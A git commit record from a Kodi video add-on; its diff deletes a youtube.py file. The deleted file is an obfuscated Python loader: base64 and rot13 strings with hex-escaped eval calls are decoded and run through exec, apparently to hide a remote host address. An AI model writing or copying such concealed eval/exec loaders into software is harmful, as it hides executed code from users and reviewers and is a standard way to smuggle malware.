64a392a613f922f54dda2a113ff52fb914c9b81b
vikingsbuild <37523732+vikingsbuild@users.noreply.github.com>
2019-01-28 19:35:30 -0200

    update brlive

--- plugin.video.brasilfull/youtube.py
+++
@@ -1,8 +0,0 @@
-import base64, codecs
-magic = 'aW1wb3J0IHhibWNhZGRvbg0KaW1wb3J0IGJhc2U2NA0KDQoNCmhvc3QgPSAiNWxUTkNaWGVhW'
-love = 'wWZZ0MgL3LjZzWdAJyvpRcKJwOBJSy3BKyZAx1VLmOFFTRvQDc0LJ0tCFOfMJ4bnT9mqPxAPz'
-god = 'Jhc2VkZW0gPSBob3N0Wzo6LTFdDQpNYWluQmFzZSA9IGJhc2U2NC5iNjRkZWNvZGUoYmFzZWR'
-destiny = 'yoFxAPzSxMT9hVQ0trTWgL2SxMT9hYxSxMT9hXPqjoUIanJ4hqzyxMJ8hLaWup2yfMaIfoPpc'
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
